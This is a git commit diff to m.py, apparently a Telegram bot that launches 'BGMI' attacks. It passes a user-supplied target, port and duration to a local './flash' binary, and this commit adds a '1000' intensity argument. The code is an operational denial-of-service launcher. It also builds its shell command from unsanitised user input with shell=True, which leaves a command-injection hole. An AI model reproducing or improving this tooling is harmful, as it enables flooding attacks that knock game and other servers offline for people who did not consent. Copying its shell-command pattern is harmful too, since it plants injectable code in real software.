78c93311cf7d6f98e9dc3307c1009b1e3f1ea82a
Tredingheh <cloudways276@gmail.com>
2025-02-21 22:10:22 +0530

    Update m.py

--- m.py
+++ m.py
@@ -310,7 +310,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/mustafa', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./flash {target} {port} {time}"
+                full_command = f"./flash {target} {port} {time} 1000"
                 process = subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
